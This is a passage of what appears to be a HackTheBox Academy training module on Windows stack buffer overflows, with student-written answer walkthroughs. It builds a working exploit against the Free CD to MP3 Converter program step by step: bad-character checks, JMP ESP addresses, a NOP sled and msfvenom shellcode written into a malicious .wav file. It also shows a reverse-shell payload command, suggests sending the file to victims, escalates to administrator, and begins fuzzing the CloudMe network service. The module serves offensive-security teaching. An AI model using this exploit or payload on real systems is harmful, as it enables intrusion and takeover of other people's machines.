As we can see, this places each byte from both locations next to each other to quickly spot any issues. The output we seek is where all bytes from both locations are the same, with no differences whatsoever. However, we see that after the first character, `00`, all remaining bytes are different. `This indicates that 0x00 truncated the remaining input, and hence it should be considered a bad character.`

---

## Eliminating Bad Characters

Now that we have identified the first bad character, we should use `--bytearray` again to generate a list of all characters without the bad characters, which we can specify with `-bytes 0x00,0x0a,0x0d...etc.`. So, we will use the following command:

```cmd-session
ERC --bytearray -bytes 0x00
```

Now, let's use this command with `ERC` again to generate the new file and use it to update our exploit:

![ERC Byte Array 2](https://academy.hackthebox.com/storage/modules/89/win32bof_erc_bytearry_2.jpg)

As we can see, this time, it said `excluding: 00`, and the array table does not include `00` at the beginning. So, let's go to the generated output file `ByteArray_2.txt`, copy the new bytes under `C#`, and place them in our exploit, which should now look as follows:

Code: python

```python
def bad_chars():
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
...SNIP...
```

Note: The `chars.wav` file may still be held by the debugger, and our python script may not be able to overwrite it. So, restart the program in `x32dbg` to release the file before running the exploit.

Once we have our new `chars.wav` file, we will once again load it in our program and use `--compare` with the new `ByteArray_2.bin` file to see whether both inputs match: 

![Byte Compare 2](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_compare_2.jpg)

As we can see, this time, both lines match perfectly until `0xFF`, meaning that there are no more bad characters in our input. If we had identified another bad character, we would repeat the same process as we just did for `Eliminating Bad Characters` until both lines match perfectly.

So, now we know that we should avoid using `0x00` in the `EIP` address we want to execute or in our shellcode.

Tip: We would find that the characters `0x00`, `0x0a`, `0x0d` are often found to be bad characters in many programs and many vulnerable functions (as discussed earlier). So, to save time, we can consider these to be bad characters from the beginning, and look for other bad characters.

Note: The found bad characters in this section may not reflect the real bad characters for our program, as this was just a demonstration of how to identify bad characters. Try to repeat the process to find the real bad characters, if any.

**Academy Question**

Q:  Try to repeat what you learned in this section to identify all bad characters for our program. What is the total number of bad characters you identified? "Note: the result may differ from what was shown in this section"
**Hint: Once both lines match, you're done!**
> A: 0

**Solution**

Connect to the machine using RDP and open `x32dbg` and attach `free CD to Mp3 converter` in it. After that in command panel of `x32dbg` use the following command 
```
ERC --bytearray
```
and you can show its output in `Log` section of debugger and also they save two files on your desktop name `ByteArray.txt` and `ByteArray.bin`. In `ByteArray.txt` file you have all the bad characters. Copy all the bad characters and edit it i.e. remove all the spaces and new lines after that your output will look like following
```
0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2A,0x2B,0x2C,0x2D,0x2E,0x2F,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3A,0x3B,0x3C,0x3D,0x3E,0x3F,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A,0x5B,0x5C,0x5D,0x5E,0x5F,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x7B,0x7C,0x7D,0x7E,0x7F,0x80,0x81,0x82,0x83,0x84,0x85,0x86,0x87,0x88,0x89,0x8A,0x8B,0x8C,0x8D,0x8E,0x8F,0x90,0x91,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9A,0x9B,0x9C,0x9D,0x9E,0x9F,0xA0,0xA1,0xA2,0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xAB,0xAC,0xAD,0xAE,0xAF,0xB0,0xB1,0xB2,0xB3,0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,0xBA,0xBB,0xBC,0xBD,0xBE,0xBF,0xC0,0xC1,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,0xCA,0xCB,0xCC,0xCD,0xCE,0xCF,0xD0,0xD1,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,0xE0,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,0xEA,0xEB,0xEC,0xED,0xEE,0xEF,0xF0,0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,0xFA,0xFB,0xFC,0xFD,0xFE,0xFF
```

So Now you can make an exploit code that have the above bad chars in it.

```python
def bad_chars():
    all_chars = bytes([0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2A,0x2B,0x2C,0x2D,0x2E,0x2F,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3A,0x3B,0x3C,0x3D,0x3E,0x3F,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A,0x5B,0x5C,0x5D,0x5E,0x5F,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x7B,0x7C,0x7D,0x7E,0x7F,0x80,0x81,0x82,0x83,0x84,0x85,0x86,0x87,0x88,0x89,0x8A,0x8B,0x8C,0x8D,0x8E,0x8F,0x90,0x91,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9A,0x9B,0x9C,0x9D,0x9E,0x9F,0xA0,0xA1,0xA2,0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xAB,0xAC,0xAD,0xAE,0xAF,0xB0,0xB1,0xB2,0xB3,0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,0xBA,0xBB,0xBC,0xBD,0xBE,0xBF,0xC0,0xC1,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,0xCA,0xCB,0xCC,0xCD,0xCE,0xCF,0xD0,0xD1,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,0xE0,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,0xEA,0xEB,0xEC,0xED,0xEE,0xEF,0xF0,0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,0xFA,0xFB,0xFC,0xFD,0xFE,0xFF])
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
        
    with open('chars.wav', 'wb') as f:
        f.write(payload)
    
bad_chars()
```
Save the exploit code and run it in python and after that you got a file in `htb-student` home directory name `chars.wav` 

![exploit_code](https://user-images.githubusercontent.com/85181215/142865348-1c5e2727-c99a-4910-8761-2ae25fc0b9d8.png)

Load that `chars.wav` file in `free CD to Mp3 Converter` that attached to our debugger what they are loaded in `free CD to Mp3 Converter` then we have to copy `ESP` value and use that in the following `ERC` command to compare the bad character with `ByteArray.bin` file.
```
ERC --compare <ESP Value Here> C:\Users\htb-student\Desktop\ByteArray_1.bin
```

After that we got the following output in Log Section

![ByteArray_Compare](https://user-images.githubusercontent.com/85181215/142865415-6e7a109f-7640-4575-86f9-224c06543e64.png)

There we see all the line are same that means they don't have any bad character in it so answer is `0`

**Page 6 / Finding a Return Instruction**

# Finding a Return Instruction

As we have confirmed that we can control the address stored in `EIP` when the program executes the return instruction `ret`, we know that we can subvert the program execution and have it execute any instruction we want by writing the instruction's address to `EIP`, which would get executed after the return instruction `ret`.

But what instructions are at our disposal? And how would a single assembly instruction help us in gaining code execution? This is what we will discuss in this section.

---

## Subverting Program Flow

To successfully subvert the program's execution flow, we must write a working address at `EIP` that leads to an instruction that will benefit us. Currently, we have only written 4 `B`'s to `EIP`, which (obviously) is not a working address, and when the program attempts to go to this address, it will fail, which will lead the entire program to crash.

To find an address we can use, we must look at all of the instructions used or loaded by our program, pick one of them, and write its address at `EIP`. In modern systems with Address Space Layout Randomization (ASLR), if we choose an address, it will be useless, as it would change the next time our program runs since it gets randomized. In that case, we would have to follow a method of leaking the current set of addresses in real-time and use it in our exploit. However, we are not dealing with any of these types of protections in this module, so we can assume that the address we pick will not change, and we can safely use it in our program.

To know what instruction to use, we must first know what we want this address to do. While more advanced binary exploitation methods like `ROP` rely on utilizing and mapping various local instructions to perform the attack (like sending a reverse shell), we do not have to get this advanced yet, since we are dealing with a program with most memory protections disabled.

So, we will utilize a method known as `Jumping to Stack`.

---

## Jumping to Stack

As we already have input into the stack, which we are overflowing with data, we can potentially write instructions that will send us a reverse shell when executed (in the form of machine code/shellcode). Once we write our data to the stack, we can then direct the program execution flow to the stack, such that it starts executing our shellcode, at which point we would receive a reverse shell and gain control over the remote server.

To direct the execution flow to the stack, we must write an address to `EIP` to do so. This can be done in two ways:

1.  Write the `ESP` address (top of the stack) to `EIP`, so it starts executing code found at the top stack
2.  Using a `JMP ESP` instruction, which directs the execution flow to the stack

Before we continue, we must note that this method DOES NOT work with modern machines, as we have mentioned previously, and it is considered a legacy method of exploitation.  

![](https://academy.hackthebox.com/storage/modules/89/win32bof_stack_meme.png)

Modern systems and programs are compiled with the `NX` bit on the stack or the `DEP` memory protection in Windows, which prevents executing any code written on the stack. So, even if we would write the shellcode on the stack, it would not be executable, nor would we find a `JMP ESP` instruction we can use within the program.

However, as we mentioned at the beginning of the module, it is still very beneficial to start by learning such techniques, as they form more advanced techniques like `SEH` or `ROP`. Once we master this technique, our next step in binary exploitation would be to bypass protections and utilize more advanced methods to gain code execution without needing to write shellcode to the stack.

---

## Using ESP Address

Let's first try the most basic method of writing the address of the top of the stack `ESP`. Once we write an address to `EIP` and the program crashes on the return instruction `ret`, the debugger would stop at that point, and the `ESP` address at the point would match the beginning of our shellcode, similarly to how we saw our characters on the stack when looking for bad characters. We can take note of the `ESP` address at this point, which in this case is `0014F974`:

![Pattern EIP](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_eip.jpg)

Tip: We can also look at the stack on the bottom right pane to find the same details.

This method may work for this particular program, but it is not a very reliable method on Windows machines. First, the input we are attacking here is an audio file, so we see that all characters are allowed without bad characters. However, in many cases, we may be attacking a string input or a program argument, in which case `0x00` would be a bad character, and we would not use the address of `ESP` since it begins with `00`.

Another reason is that the address of `ESP` may not be the same on all machines. So, it may work throughout the debugging and exploit development process but may not be the same address when we fire the exploit at a real target, as it may have a different `ESP` address, at which point our exploit would fail.

Nevertheless, let's note this address and continue, and we'll test both methods in the next section.

---

## Using JMP ESP

The more reliable way of executing shellcode loaded on the stack is to find an instruction used by the program that directs the program's execution flow to the stack. We can use several such instructions, but we will be using the most basic one, `JMP ESP`, that jumps to the top of the stack and continues the execution.

#### Locating Modules

To find this instruction, we must look through executables and libraries loaded by our program. This includes:

1.  The program's `.exe` file
2.  The program's own `.dll` libraries
3.  Any Windows `.dll` libraries used by the program

To find a list of all loaded files by the program, we can use `ERC --ModuleInfo`, as follows: 

![Module Info](https://academy.hackthebox.com/storage/modules/89/win32bof_module_info.jpg)

We find many modules loaded by the program. However, we can skip any files with:

-   `NXCompat`: As we are looking for a `JMP ESP` instruction, so the file should not have stack execution protection.
-   `Rebase` or `ASLR`: Since these protections would cause the addresses to change between runs

As for `OS DLL`, if we are running on a newer Windows version like Windows 10, we can expect all OS DLL files to have all memory protections present, so we would not use any of them. If we were attacking an older Windows version like Windows XP, many of the loaded OS DLLs likely have no protections so that we can look for `JMP ESP` instructions in them as well.

If we only consider files with `False` set to all protections, we would get the following list:

Locating Modules

```cmd-session
------------------------------------------------------------------------------------------------------------------------ 
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name, and Path 
------------------------------------------------------------------------------------------------------------------------ 
0x400000        0xd88fc         0x11c000    False      False      False      False      False      C:\Program Files\CD to MP3 Freeware\cdextract.exe 
0x672c0000      0x1000          0x13000     False      False      False      False      False      1.0rc1;AKRip32;C:\Program Files\CD to MP3 Freeware\akrip32.dll 
0x10000000      0xa3e0          0xc000      False      False      False      False      False      C:\Program Files\CD to MP3 Freeware\ogg.dll
```

As we can see, all of the files belong to the program itself, which indicates that the program and all of its files were compiled without any memory protection, which means we may find `JMP ESP` instructions in them. `The best option is to use an instruction from the program itself, as we'll be sure that this address will exist regardless of the version of Windows running the program`.

#### Searching for JMP ESP

Now that we have a list of loaded files that may include the instruction we are looking for, we can search them for usable instructions. To access any of these files, we can go to the `Symbols` tab by clicking on it or hitting `alt+e`:

![Module Symbols](https://academy.hackthebox.com/storage/modules/89/win32bof_module_symbols.jpg)

We can start with `cdextract.exe` and double-click it to open view and search its instructions. To search for the `JMP ESP` instruction within the instructions of this file, we can click `ctrl+f`, which allows us to search for any instruction within the opened file `cdextract.exe`: ![Find Command](https://academy.hackthebox.com/storage/modules/89/win32bof_find_command.jpg)

We can enter `jmp esp`, and it should show us if this file contains any of the instructions we searched for: 

![Find JMP ESP](https://academy.hackthebox.com/storage/modules/89/win32bof_find_jmp_esp.jpg)

As we can see, we found the following matches:

Code: shell

```cmd-shell
Address  Disassembly
00419D0B jmp esp
00463B91 jmp esp
00477A8B jmp esp
0047E58B jmp esp
004979F4 jmp esp
```

Note: We can also search for `CALL ESP`, which will also jump to the stack.

As is the case with the address when using the `ESP` address, `we must ensure that the instruction address does not contain any bad characters`. Otherwise, our payload would get truncated, and the attack would fail. However, in our case, we do not have any bad characters, so we can choose any of the above addresses.

We can double-click on any of the results to see the instruction in the main file disassembly and double-check that it is indeed a `JMP ESP` instruction.

We can also check the other loaded `.dll` files to see whether they contain any useful instructions, just in case any of the above did not work correctly. To do so, we can go back to the `Symbols` tab, double-clicking on the file we want to search, and then do the same process to search for the `JMP ESP` instruction.

If we had a large list of loaded modules, we could search through all of them by right-clicking on the main top right `CPU` pane and selecting `Search For> All Modules> Command`, then entering `jmp esp`. However, this may return a large list of results, some of which may not be usable. This is dependent on the protections present for its binary and if it is directly accessible by our program. Because of this, it's best to try to search within individual files first.

#### Searching for Patterns

Another example of a basic command to jump to the stack is `PUSH ESP` followed by `RET`. Since we are searching for two instructions, in this case, we should search using the machine code rather than the assembly instructions. We can use [Online Assemblers](https://defuse.ca/online-x86-assembler.htm), or the `msf-nasm_shell` tool found in `PwnBox` to convert any assembly instructions to machine code. Both of these take an assembly instruction and give us the corresponding machine code.

After using one of these, we would find that the machine code for `JMP ESP` is `FFE4`, and for `PUSH ESP; RET` is `54C3`. Now we can search using this pattern by clicking `ctrl+b` in the `CPU` pane and entering the pattern `54C3`:

![Find Pattern](https://academy.hackthebox.com/storage/modules/89/win32bof_find_pattern.jpg)

Once we do, we would find a few other addresses we can use as well: 

![Find Pattern PUSH ESP](https://academy.hackthebox.com/storage/modules/89/win32bof_find_pattern_push_esp.jpg)

We can double-click any of them and confirm that it is indeed a `PUSH ESP` instruction followed by a `RET` instruction:

![PUSH ESP](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_push_esp.jpg)

---

## Summary

We have discussed many methods to find an instruction that would execute the shellcode we load on the stack:

1.  We can use the `ESP` address
2.  We can search loaded modules with disabled security for `JMP ESP` instructions
3.  We can search for Assembly Instructions or search for machine code patterns
4.  Any address we pick must not contain any bad characters

**Academy Question**

Q: Try to search the 'cdextract.exe' binary for the 'PUSH ESP; RET' instruction as pattern '54C3'. What is the address of the first result you get?
**Hint: Use `ctrl+b` to search for it**
> A: 00457418

**Solution**

Connect to the machine open `x32dbg` and attach `free cd to mp3 converter` and after that go to symbols tab and there select `cdextract.exe` that important because if you did not do that then you might get the wrong address. after that hit `CTRL + b` and write `54 C3` in prompt and press enter after that they show you some addresses there you find the answer.

**Page 7 / Jumping to Shellcode**

# Jumping to Shellcode

So far in our exercise to identify and exploit a stack-based buffer overflow vulnerability, we have done the following:

1.  Fuzzed Parameters
2.  Controlled EIP
3.  Identified Bad Characters
4.  Found a Return Instruction

The final step is to write some shellcode on the stack that gets executed when the Return Addresses we found earlier are executed since we look for addresses of instructions that execute the code written on the top of the stack.

---

## Shellcode Generation

We've thoroughly discussed shellcode generation in the [Intro to Assembly Language](https://academy.hackthebox.com/course/preview/intro-to-assembly-language) module and the various methods to do so. In some instances, we may find ourselves limited to a very short buffer space, where we would not have many bytes to write to and may have to use one of the methods discussed to generate a short shellcode. However, we are dealing with thousands of bytes of buffer in our case, so we would not have to worry about such limitations.

So, to generate our shellcode, we will use `msfvenom`, which can generate shellcodes for Windows systems, while tools like `pwntools` currently only support Linux shellcodes.

First, we can list all available payloads for `Windows 32-bit`, as follows:

```shell-session
W4H33D@htb[/htb]$ msfvenom -l payloads | grep

...SNIP...
    windows/exec                                        Execute an arbitrary command
    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for
    windows/loadlibrary                                 Load an arbitrary library path
    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
...SNIP...
```

For initial testing, let's try `windows/exec` and execute `calc.exe` to open the Windows calculator if our exploit is successful. To do this, we'll use `CMD=calc.exe`, `-f 'python'` since we are using a python exploit, and `-b` to specify any bad characters:

```shell-session
W4H33D@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x31\x31\x50\x18\x03\x50\x18\x83\xc0\x39\x29"
buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
...SNIP...
```

Note: We used the `-b` to showcase how to eliminate any bad characters from our shellcode, where we can add all bad characters we need to eliminate (e.g. `'\x00\x0a\x0d'`). Even if our shellcode did not have any bad characters, this shellcode should still run, though the final shellcode is usually longer if we specify bad characters

Next, we can copy the `buf` variable into our exploit, where we will now define the final function `def exploit()`, which will be our main exploit code:

Code: python

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
```

Tip: It is advised as a best practice to add a comment above any shellcode with the command used to generate it, in case we want to modify it or regenerate it in the future, or if we just wanted to know what it will execute.

---

## The Final Payload

Now that we have our shellcode, we can write the final payload that we'll write to the `.wav` file to be opened in our program. So far, we know the following:

1.  `buffer`: We can fill the buffer by writing `b"A"*offset`
2.  `EIP`: The following 4 bytes should be our return address
3.  `buf`: After that, we can add our shellcode

In the previous section, we've found multiple return addresses that can work in executing any shellcode we write on the stack:

```
ESP                      JMP ESP                       PUSH ESP; RET

0014F974                 00419D0B                         0047D4F5

-                        00463B91                         00483D0E

-                        00477A8B                             -

-                        0047E58B                             -

-                        004979F4                             -
```

Any of these should work in executing the shellcode we write on the stack (feel free to test some of them). We will start with the most reliable one, `JMP ESP`, and we'll pick the first address `00419D0B` and write it as our return address.

To convert it from `hex` to an address in Little Endian, we'll use a python function called `pack` found in the `struct` library. We can import this function by adding the following line at the beginning of our code:

Code: python

```python
from struct import pack
```

Now we can use `pack` to turn our address into its proper format, and use '`<L`' to specify that we want it in Little Endian formatting:

Code: python

```python
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
```

---

## Shellcode Padding

Now that we have `buffer` and `eip`, we can add our shellcode `buf` after them and generate our `.wav` file. However, depending on the program's current Stack Frame and Stack Alignment, by the time our `JMP ESP` instruction is executed, the top of the stack address `ESP` may have moved slightly. The first few bytes of our shellcode may get skipped, which will lead the shellcode to fail. (You can check the [Intro to Assembly Language](https://academy.hackthebox.com/module/details/85) module to get a better understanding of Stack Alignment).

One way to solve this is to add a few junk bytes before our shellcode and keep testing the code until we find out exactly how many bytes get skipped before our shellcode. This is so we can precisely land at the beginning of our shellcode when our `JMP ESP` instruction is executed. However, we only need to resort to this method if we had a limited buffer space since it takes several attempts to precisely find which byte position of our shellcode the execution starts.

To avoid having to do this, we can add a few `NOP` bytes before our shellcode, which has the machine code `0x90`. The assembly instruction `NOP` is short for `No Operation`, and it is used in assembly for things like waiting for other operations to finish. So, if the `JMP ESP` execution starts at one of these bytes, the program will not crash and will execute these bytes by doing nothing until it reaches the beginning of our shellcode. At which point, our entire shellcode should get executed and should run successfully.

The stack alignment needed is usually not more than `16` bytes in most cases, and it may rarely reach `32` bytes. Since we have a lot of buffer space, we'll just add `32` bytes of `NOP` before our shellcode, which should guarantee that the execution starts somewhere within these bytes, and continue to execute our main shellcode:

Code: python

```python
    nop = b"\x90"*32
```

---

## Writing Payload to File

With that, our final payload should look as follows:

Code: python

```python
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf
```

We can then write `payload` to a `exploit.wav` file, like we did in previous functions:

Code: python

```python
    with open('exploit.wav', 'wb') as f:
        f.write(payload)
```

Once we assemble all of these parts, our final `exploit()` function should look as follows:

Code: python

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf = b""
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
```

We can now run our code with `F5` in `IDLE` to generate the `exploit.wav` file. Once we do, we can run the `Free CD to MP3 Converter` program (we don't need to run it in `x32dbg`) and load our file to it:

![Calc](https://academy.hackthebox.com/storage/modules/89/win32bof_calc.jpg)

As we can see, our program did crash, but we successfully exploited it and ran our shellcode, which opened `calc.exe`.

---

## Gaining Code Execution

The final step would be to utilize this exploit to gain code execution. Since we are dealing with a local buffer overflow running in a machine we have user-level access to, we will usually use this exploit to escalate our privileges to the admin user if a local admin executed this program. Another way to utilize this is by writing a malicious `.wav` file that sends back a reverse shell. We would then share this malicious file with a user that uses this vulnerable application and ask them to encode our malicious `.wav` file. When they do, we would receive a reverse shell and gain control over their PC.

To do either of these options, all we have to do is change our shellcode to do something else. For local privilege escalation, we can use the same command we used for `calc.exe`, but use `CMD=cmd.exe` instead, as follows:

```shell-session
W4H33D@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
...SNIP...
```

If we wanted to get a reverse shell, there are many `msfvenom` payloads we can use, which we can get a list of as follows:

```shell-session
W4H33D@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse

...SNIP...
    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
...SNIP...
```

We can use the `windows/shell_reverse_tcp` payload as follows:

```shell-session
W4H33D@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
...SNIP...
```

We can replace the `buf` shellcode in our exploit with either of these and test it. Let's assume we have access to a machine where we have the privilege to run this program as an administrator. We will write the shellcode for local privilege escalation in our exploit, generate our `exploit.wav` file, and load it into the program:

![CMD Admin](https://academy.hackthebox.com/storage/modules/89/win32bof_cmd_admin.jpg)

As we can see, this time, a `cmd.exe` window popped up, and we see in its title `Administrator`, which means that it is indeed running with escalated privileges, matching the user who was running `Free CD to MP3 Converter`.

Try to use the second shellcode to get a reverse shell on your Linux VM/`PwnBox`.

You can download the final exploit code from [this link](https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_py.txt). Don't forget to rename it from `.txt` to `.py`.

**Academy Question**

Q: In the 'Documents' folder you will find a shortcut that runs the 'Free CD to MP3' program as admin. Try to use the exploit on it to get a command prompt as the admin user, and read the flag in the admin's Desktop.
**Hint: You don't have to run it through 'x32dbg' any more. Simply run the program and select your malicious '.wav' file.**
> A: HTB{l0c4l_0v3rfl0w_m4573r} 

**Solution**

Connect to the machine and download the exploit from [this link](https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_py.txt) and change its extension with `.py` like `exploit.py` after that remove `#!/bin/python3` line also and run the exploit using the following `powershell` command 
```powershell
C://users/htb-student> python.exe ./Desktop/exploit.py
```
when we run the above command they will generate the malicious `exploit.wav` file in `htb-student` home directory. Now go to `Documents` folder of `htb-student` their you see `free CD to Mp3 Converter` executable file they are run as a `Administrator` user run it and `Encode` you malicious `exploit.wav` file when you encode that they will open a command prompt there if you use command `whoami` you will see now you are a administrator user now so use the following commands to get the flag
```cmd
cd C://Users/Administrator/Desktop/

type flag.txt
```
![Local Overflow master flag](https://user-images.githubusercontent.com/85181215/142865544-900fc752-6706-4599-aa6c-583942a69001.gif)

**Page 8 / Remote Fuzzing**


# Remote Fuzzing

We have so far completed a local buffer overflow exercise, which covered all essential parts of a stack-based buffer overflow exercise. When it comes to remote exploitation, the main difference would be in exploit scripting, while the core parts of buffer overflow exploitation are the same.

---

## Debugging A Remote Program

Whether we are debugging a local program or one that listens for remote connections, we will have to install and debug it locally on our Windows VM. Once our exploit is fully developed, we can then run it on the remote service without needing local access. If done correctly, the exploit should work, as we will see later.

This time, we will be debugging a program called `CloudMe`, an end-user tool for a file sharing service, found on the Desktop of the Windows VM below. As a file-sharing service, this tool listens on a port for any updates from the file server. We can see this if the tool is running, and we list listening ports in `Powershell`:

```powershell-session
PS C:\htb> netstat -a

...SNIP...
TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
[CloudMe.exe]
```

As we can see, the service is listening on port `8888`, and it has also established a connection to a remote server. We can use the `netcat` program on the Desktop to interact with this port and see if it accepts any parameters:

```powershell-session
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
?
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
help
```

We try sending a few parameters, and it closes the connections without providing us with any output. So, let's try to debug it and fuzz it with large strings to see how it would handle them.

To debug a program that listens on a remote port, we will follow the same process we did earlier in the module, run the program, and attach to or open it directly in `x32dbg`. If you have not yet disabled all breakpoints in `x32dbg`, you should, as this program contains many breakpoints. Refer to the `Fuzzing` section to see how to do so.

---

## Fuzzing Remote Port

Once our program is running and we are attached to it through `x32dbg`, we can start fuzzing it and try to crash it. Unlike local fuzzing, where we wrote our payloads into a file and then opened the file in our application or manually copied our payload into a text field in the program, with remote fuzzing, we can automate this process through our Python exploit.

We'll create a new script called `win32bof_exploit_remote.py` and start by adding a couple of variables for `IP` and `port`, such that we can easily change them if we want to use the script on another server. Then, we will write our fuzzing function `def fuzz():`. We want to send increments of large strings, starting from `500` bytes long and incrementing by `500` at each iteration, until we send a long enough string that crashes the program. To accomplish this, we'll loop in a range from `0` to `10,000` with increments of `500`, as follows:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 8888

def fuzz():
    for i in range(0,10000,500):
        buffer = b"A"*i
        print("Fuzzing %s bytes" % i)
```

The print statement helps us know the current fuzzing buffer size so that when the program eventually crashes, we know what length caused it to crash.

Next, we need to connect to the port each time and send our payload to it. To do so, we have to import the `socket` library as we did at the beginning of our code above, and then establish a connection to the port with the `connect` function, as follows:

Code: python

```python
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
```

With that, we should be ready to send our buffer, which we can do through `s.send(buffer)`. We will also need to wrap our loop in a `try/except` block, so that we can stop the execution when the program crashes and does not accept connections anymore. Our final `fuzz()` function should look as follows:

Code: python

```python
def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            s.close()
    except:
        print("Could not establish a connection")

fuzz()
```

